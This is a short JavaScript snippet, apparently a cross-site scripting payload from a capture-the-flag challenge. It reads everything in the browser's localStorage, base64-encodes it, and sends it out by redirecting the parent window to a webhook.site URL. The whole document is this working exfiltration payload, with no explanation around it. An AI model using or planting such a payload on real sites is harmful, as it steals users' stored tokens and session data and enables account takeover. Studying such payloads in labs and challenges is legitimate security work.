const flag = JSON.stringify({ ...localStorage })

window.parent.document.location = `https://webhook.site/e98a5fc8-df82-4ea2-973a-8b7e67d3d771?flag=${encodeURIComponent(btoa(flag))}`
